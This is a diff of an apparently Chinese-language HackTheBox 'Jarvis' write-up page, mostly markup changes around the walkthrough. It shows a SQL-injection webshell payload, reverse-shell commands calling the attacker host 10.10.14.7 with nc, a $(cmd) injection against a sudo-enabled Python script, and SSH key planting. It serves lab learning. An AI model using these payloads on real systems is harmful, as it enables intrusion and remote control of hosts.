@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;194  10.10.10.143   端口扫描需要全端口，有一个64999(不过也没怎么用到这个端口)： 1234567891011121314151617181920212223242526272829303132333435363738$ nmap -p- --min-rate&#x3D;1000">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;194  10.10.10.143                                                                                                              端口扫描需要全端口，有一个64999(不">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Jarvis - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2020/02/11/Jarvis-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;194  10.10.10.143   端口扫描需要全端口，有一个64999(不过也没怎么用到这个端口)： 1234567891011121314151617181920212223242526272829303132333435363738$ nmap -p- --min-rate&#x3D;1000">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;194  10.10.10.143                                                                                                              端口扫描需要全端口，有一个64999(不">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010701.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010702.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010703.jpg">
@@ -133,7 +133,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -223,52 +223,143 @@
 </li>
 <li><h2 id="10-10-10-143"><a href="#10-10-10-143" class="headerlink" title="10.10.10.143"></a>10.10.10.143</h2></li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010701.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010701.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>需要全端口，有一个64999(不过也没怎么用到这个端口)：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -p- --min-rate=1000 10.10.10.143</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-07 13:19 CST</span><br><span class="line">Nmap scan report for 10.10.10.143</span><br><span class="line">Host is up (0.071s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT      STATE    SERVICE</span><br><span class="line">22/tcp    open     ssh</span><br><span class="line">80/tcp    open     http</span><br><span class="line">45505/tcp filtered unknown</span><br><span class="line">64999/tcp open     unknown</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1008.70 seconds</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -p 22,80,64999 10.10.10.143</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-07 13:19 CST</span><br><span class="line">Nmap scan report for 10.10.10.143</span><br><span class="line">Host is up (0.082s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)</span><br><span class="line">|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)</span><br><span class="line">|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-cookie-flags:</span><br><span class="line">|   /:</span><br><span class="line">|     PHPSESSID:</span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Stark Hotel</span><br><span class="line">64999/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 16.72 seconds</span><br></pre></td></tr></table></figure>
 
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>一个hotel：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010702.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010702.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="64999"><a href="#64999" class="headerlink" title="64999"></a>64999</h2><p>直接访问显示banned 90秒：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010703.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010703.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>80的web很基础的sql注入：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010704.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010705.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010704.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010705.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="sqli-to-webshell"><a href="#sqli-to-webshell" class="headerlink" title="sqli to webshell"></a>sqli to webshell</h2><p>load_file,into outfile 读写文件，直接写wbeshell：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.143&#x2F;room.php?cod&#x3D;-1 union select 1,&#39;&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;&#39;,3,4,5,6,7 into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;miao.php&#39;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010706.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010706.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h1><p>服务器有nc，直接reverse shell：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.143&#x2F;miao.php?cmd&#x3D;nc -e &#x2F;bin&#x2F;bash 10.10.14.7 4445</span><br><span class="line"></span><br><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010707.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010707.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>当前是www-data用户，sudo -l显示可以无密码以pepper身份执行/var/www/Admin-Utilities/simpler.py：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010708.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010708.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>查看这个文件，里面有一个exec_ping函数调用了system，command是我们输入的，有简单的过滤：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_ping</span><span class="params">()</span>:</span></span><br><span class="line">    forbidden = [<span class="string">'&amp;'</span>, <span class="string">';'</span>, <span class="string">'-'</span>, <span class="string">'`'</span>, <span class="string">'||'</span>, <span class="string">'|'</span>]</span><br><span class="line">    command = input(<span class="string">'Enter an IP: '</span>)   </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> forbidden:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> command:</span><br><span class="line">            print(<span class="string">'Got you'</span>)</span><br><span class="line">            exit()</span><br><span class="line">    os.system(<span class="string">'ping '</span> + command)</span><br></pre></td></tr></table></figure>
 
 <p>但可以使用<code>$(cmd)</code>这种方式执行命令：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -u pepper /var/www/Admin-Utilities/simpler.py -p</span><br><span class="line"></span><br><span class="line">Enter an IP: $(whoami).test.com</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010709.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010709.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="simpler-py"><a href="#simpler-py" class="headerlink" title="simpler.py"></a>simpler.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> listdir</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_help</span><span class="params">()</span>:</span></span><br><span class="line">    message=<span class="string">'''</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Simpler   -   A simple simplifier ;)                 *</span></span><br><span class="line"><span class="string">* Version 1.0                                          *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">Usage:  python3 simpler.py [options]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Options:</span></span><br><span class="line"><span class="string">    -h/--help   : This help</span></span><br><span class="line"><span class="string">    -s          : Statistics</span></span><br><span class="line"><span class="string">    -l          : List the attackers IP</span></span><br><span class="line"><span class="string">    -p          : ping an attacker IP</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    print(message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_header</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'''***********************************************</span></span><br><span class="line"><span class="string">     _                 _</span></span><br><span class="line"><span class="string"> ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _</span></span><br><span class="line"><span class="string">/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |</span></span><br><span class="line"><span class="string">\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |</span></span><br><span class="line"><span class="string">|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |</span></span><br><span class="line"><span class="string">                |_|               |_|    |___/</span></span><br><span class="line"><span class="string">                                @ironhackers.es</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">***********************************************</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_statistics</span><span class="params">()</span>:</span></span><br><span class="line">    path = <span class="string">'/home/pepper/Web/Logs/'</span></span><br><span class="line">    print(<span class="string">'Statistics\n-----------'</span>)</span><br><span class="line">    listed_files = listdir(path)</span><br><span class="line">    count = len(listed_files)</span><br><span class="line">    print(<span class="string">'Number of Attackers: '</span> + str(count))</span><br><span class="line">    level_1 = <span class="number">0</span></span><br><span class="line">    dat = datetime(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">    ip_list = []</span><br><span class="line">    reks = []</span><br><span class="line">    ip = <span class="string">''</span></span><br><span class="line">    req = <span class="string">''</span></span><br><span class="line">    rek = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> listed_files:</span><br><span class="line">        f = open(path + i, <span class="string">'r'</span>)</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        level2, rek = get_max_level(lines)</span><br><span class="line">        fecha, requ = date_to_num(lines)</span><br><span class="line">        ip = i.split(<span class="string">'.'</span>)[<span class="number">0</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">1</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">2</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">if</span> fecha &gt; dat:</span><br><span class="line">            dat = fecha</span><br><span class="line">            req = requ</span><br><span class="line">            ip2 = i.split(<span class="string">'.'</span>)[<span class="number">0</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">1</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">2</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">if</span> int(level2) &gt; int(level_1):</span><br><span class="line">            level_1 = level2</span><br><span class="line">            ip_list = [ip]</span><br><span class="line">            reks=[rek]</span><br><span class="line">        <span class="keyword">elif</span> int(level2) == int(level_1):</span><br><span class="line">            ip_list.append(ip)</span><br><span class="line">            reks.append(rek)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'Most Risky:'</span>)</span><br><span class="line">    <span class="keyword">if</span> len(ip_list) &gt; <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">'More than 1 ip found'</span>)</span><br><span class="line">    cont = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ip_list:</span><br><span class="line">        print(<span class="string">'    '</span> + i + <span class="string">' - Attack Level : '</span> + level_1 + <span class="string">' Request: '</span> + reks[cont])</span><br><span class="line">        cont = cont + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">'Most Recent: '</span> + ip2 + <span class="string">' --&gt; '</span> + str(dat) + <span class="string">' '</span> + req)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_ip</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'Attackers\n-----------'</span>)</span><br><span class="line">    path = <span class="string">'/home/pepper/Web/Logs/'</span></span><br><span class="line">    listed_files = listdir(path)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> listed_files:</span><br><span class="line">        f = open(path + i,<span class="string">'r'</span>)</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        level,req = get_max_level(lines)</span><br><span class="line">        print(i.split(<span class="string">'.'</span>)[<span class="number">0</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">1</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">2</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">3</span>] + <span class="string">' - Attack Level : '</span> + level)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">date_to_num</span><span class="params">(lines)</span>:</span></span><br><span class="line">    dat = datetime(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">    ip = <span class="string">''</span></span><br><span class="line">    req=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Level'</span> <span class="keyword">in</span> i:</span><br><span class="line">            fecha=(i.split(<span class="string">' '</span>)[<span class="number">6</span>] + <span class="string">' '</span> + i.split(<span class="string">' '</span>)[<span class="number">7</span>]).split(<span class="string">'\n'</span>)[<span class="number">0</span>]</span><br><span class="line">            regex = <span class="string">'(\d+)-(.*)-(\d+)(.*)'</span></span><br><span class="line">            logEx=re.match(regex, fecha).groups()</span><br><span class="line">            mes = to_dict(logEx[<span class="number">1</span>])</span><br><span class="line">            fecha = logEx[<span class="number">0</span>] + <span class="string">'-'</span> + mes + <span class="string">'-'</span> + logEx[<span class="number">2</span>] + <span class="string">' '</span> + logEx[<span class="number">3</span>]</span><br><span class="line">            fecha = datetime.strptime(fecha, <span class="string">'%Y-%m-%d %H:%M:%S'</span>)</span><br><span class="line">            <span class="keyword">if</span> fecha &gt; dat:</span><br><span class="line">                dat = fecha</span><br><span class="line">                req = i.split(<span class="string">' '</span>)[<span class="number">8</span>] + <span class="string">' '</span> + i.split(<span class="string">' '</span>)[<span class="number">9</span>] + <span class="string">' '</span> + i.split(<span class="string">' '</span>)[<span class="number">10</span>]</span><br><span class="line">    <span class="keyword">return</span> dat, req</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_dict</span><span class="params">(name)</span>:</span></span><br><span class="line">    month_dict = &#123;<span class="string">'Jan'</span>:<span class="string">'01'</span>,<span class="string">'Feb'</span>:<span class="string">'02'</span>,<span class="string">'Mar'</span>:<span class="string">'03'</span>,<span class="string">'Apr'</span>:<span class="string">'04'</span>, <span class="string">'May'</span>:<span class="string">'05'</span>, <span class="string">'Jun'</span>:<span class="string">'06'</span>,<span class="string">'Jul'</span>:<span class="string">'07'</span>,<span class="string">'Aug'</span>:<span class="string">'08'</span>,<span class="string">'Sep'</span>:<span class="string">'09'</span>,<span class="string">'Oct'</span>:<span class="string">'10'</span>,<span class="string">'Nov'</span>:<span class="string">'11'</span>,<span class="string">'Dec'</span>:<span class="string">'12'</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> month_dict[name]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_max_level</span><span class="params">(lines)</span>:</span></span><br><span class="line">    level=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Level'</span> <span class="keyword">in</span> j:</span><br><span class="line">            <span class="keyword">if</span> int(j.split(<span class="string">' '</span>)[<span class="number">4</span>]) &gt; int(level):</span><br><span class="line">                level = j.split(<span class="string">' '</span>)[<span class="number">4</span>]</span><br><span class="line">                req=j.split(<span class="string">' '</span>)[<span class="number">8</span>] + <span class="string">' '</span> + j.split(<span class="string">' '</span>)[<span class="number">9</span>] + <span class="string">' '</span> + j.split(<span class="string">' '</span>)[<span class="number">10</span>]</span><br><span class="line">    <span class="keyword">return</span> level, req</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_ping</span><span class="params">()</span>:</span></span><br><span class="line">    forbidden = [<span class="string">'&amp;'</span>, <span class="string">';'</span>, <span class="string">'-'</span>, <span class="string">'`'</span>, <span class="string">'||'</span>, <span class="string">'|'</span>]</span><br><span class="line">    command = input(<span class="string">'Enter an IP: '</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> forbidden:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> command:</span><br><span class="line">            print(<span class="string">'Got you'</span>)</span><br><span class="line">            exit()</span><br><span class="line">    os.system(<span class="string">'ping '</span> + command)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    show_header()</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        show_help()</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'-h'</span> <span class="keyword">or</span> sys.argv[<span class="number">1</span>] == <span class="string">'--help'</span>:</span><br><span class="line">        show_help()</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">'-s'</span>:</span><br><span class="line">        show_statistics()</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">'-l'</span>:</span><br><span class="line">        list_ip()</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">'-p'</span>:</span><br><span class="line">        exec_ping()</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        show_help()</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure>
 
 <h1 id="pepper-shell"><a href="#pepper-shell" class="headerlink" title="pepper shell"></a>pepper shell</h1><p>那就直接以pepper身份反弹shell:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo -u pepper &#x2F;var&#x2F;www&#x2F;Admin-Utilities&#x2F;simpler.py -p</span><br><span class="line"></span><br><span class="line">$(&#x2F;tmp&#x2F;miao.sh)</span><br><span class="line"></span><br><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010710.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010710.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="ssh-key"><a href="#ssh-key" class="headerlink" title="ssh key"></a>ssh key</h2><p>为了后续方便操作可以直接把ssh公钥写进去：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir .ssh</span><br><span class="line">cd .ssh</span><br><span class="line">echo 'ssh-rsa *****' &gt; authorized_keys</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010711.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010711.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="miao-sh"><a href="#miao-sh" class="headerlink" title="miao.sh"></a>miao.sh</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo -e &#39;#!&#x2F;bin&#x2F;bash\n\nnc -e &#x2F;bin&#x2F;bash 10.10.14.7 4446&#39; &gt; &#x2F;tmp&#x2F;miao.sh</span><br><span class="line"></span><br><span class="line">chmod +x &#x2F;tmp&#x2F;miao.sh</span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>petter用户目录得到user.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010712.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010712.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
